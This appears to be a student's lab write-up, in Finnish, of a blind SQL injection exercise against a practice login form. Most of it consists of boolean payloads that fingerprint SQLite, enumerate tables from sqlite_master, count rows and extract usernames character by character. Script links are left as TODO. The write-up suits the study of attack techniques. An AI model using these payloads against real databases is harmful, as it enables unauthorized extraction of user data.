# Sokkona tehty SQL-injektio

**Tekijä:** Lauri Pimiä (lailpimi)
**Perustelut:** Kaikki tehtävät tehty, joten odotan 1.0p.

## T1

Kokeilin ensin user-id kenttää syöttämällä yhden ' merkin. Koska tämä antoi 
virheen, on kyseinen kenttä haavoittuvainen. Nyt pystyn myös kokeilemaan 
True/false logiikkaa syötteellä "' or 1=1", Tämä palauttaa Welcome eli True 
ja syöte "' or 1=2 --" taas Nope eli False. "--" ovat kommenttisymboleita, 
jotka käytännössä pysäyttävät sql kyselyn syötteeni jälkeen.

Tiivistettynä siis:
' or 1=1 --  = Welcome!
' or 1=2 --  = Nope!
'			 = Error!

## T2

Tietokanta on SQLite3. Ratkaisin tämän kokeilemalla mikä versiokysely antaa 
virheen ja mikä ei.

Syöte:
' or sqlite_version() --	= Welcome!

Komento oli siis toimiva, eli tietokanta on sqlite3. Kokeilin myös 
"' or @@version" (Mysql) ja "' or version()"(PostgreSQL), jotka molemmat 
antoivat virheen.

## T3

Löytyi taulut 'users_18' ja 'messages'

Etsin ensin hieman sqlite syntaksia ja löysin tämän kätevän cheatsheetin:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version

Tiedämme jo, että tietokannassa on kaksi taulua, mutta halusin vielä 
varmentaa tämän, jonka tein komennolla:
`
' or (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') = 2 --
`
Tämä siis saa sqlite_master taulusta listan tauluja, joiden määrän 
laskemme count() funktiolla. Taulujen nimien testaamiseen käytin yhä 
True/false arvailua ja tein sitä varten yksinkertaisen Python skriptin, joka 
löytyy täältä -> TODO

Skripti selvittää ensin taulun nimen pituuden komennolla:
`
' or (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0) = pituus_numerona --
` 
Jos saadaan True (Welcome), ollaan löydetty oikea pituus, muuten kasvatetaan 
pituutta kunnes oikea pituus löytyy. Tätä voisi nopeuttaa < tai > operaattoreilla, mutta en nähnyt sitä vaivan arvoisena tässä tapauksessa.
Parametri limit määrittää kuinka monta riviä vastaukseen kuuluu ja offset 
rivin jolta aloitetaan.

Kun taulun nimen pituus on saatu, aletaan nimen merkkejä arvailemaan yksi 
kerrallaan komennolla:
`
' or (SELECT substr(tbl_name,kohta_nimessa,1) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = 'merkki' --
`
Tämä siis hakee taulun nimestä kirjaimen halutusta kohdasta ja sitä vastaan 
kokeillaan eri kirjaimia kunnes saadaan True. Sitten siirrytään seuraavaan 
kirjaimeen, kunnes kokonainen nimi on valmis.

## T4

Nyt kun taulun nimi on tiedossa oli rivien määrä helppo kokeilla komennolla:

`
' or (SELECT COUNT(*) FROM users_18) = 5 -- 
`

Tein tämän käsin käyttämällä < ja > operaattoreita. Esimerkiksi alla oleva 
antaa True, koska rivejä on enemmän kuin 4. 
`
' or (SELECT COUNT(*) FROM users_18) > 4 -- 
`

## T5

Käyttäjätunnukset: 11111, abramov, accounting, admin ja postmaster

Jotta pystyisin saamaan taulusta käyttäjätunnuksia, tuli minun ensimmäiseksi 
selvittää missä sarakkeessa ne olivat. Käytin taas samaa periaatetta kuin 
aikaisemmin, joten komento pituudelle oli:
`
' or (SELECT length(sql) FROM sqlite_master WHERE type!='meta' and sql NOT NULL and name not like 'sqlite_%' and name='users_18' limit 1 offset 0)= pituus_numerona --
`
ja nimille
`
' or (SELECT substr(sql,kohta_nimessa,1) FROM sqlite_master WHERE type!='meta' and sql NOT NULL and name NOT like 'sqlite_%' and name='users_18' limit 1 offset 0) = 'merkki' --
`
Skripti -> TODO

Tämä ei itse asiassa toiminut aivan kuten ajattelin, sillä ulos tulostui: 
CREATE TABLE users_18 (uid TEXT, pass Text, PRIMARY KEY (uid))

Sain tästä silti sarakkeet, eli uid ja pass. Nyt tein taas samankaltaisen 
skriptin, jossa ensin katsottiin uid:n pituus:
`
' or (SELECT length(uid) FROM users_18 limit 1 offset 0)= pituus_numerona --
`
ja sitten itse uid
`
' or (SELECT substr(uid,kohta_nimessa,1) FROM users_18 limit 1 offset 0) = 'merkki' --
`

T4 perusteella saamme 5 käyttäjää, yksi per offset. Löytyneet käyttäjät siis:
11111, abramov, accounting, admin ja postmaster

Skripti -> 

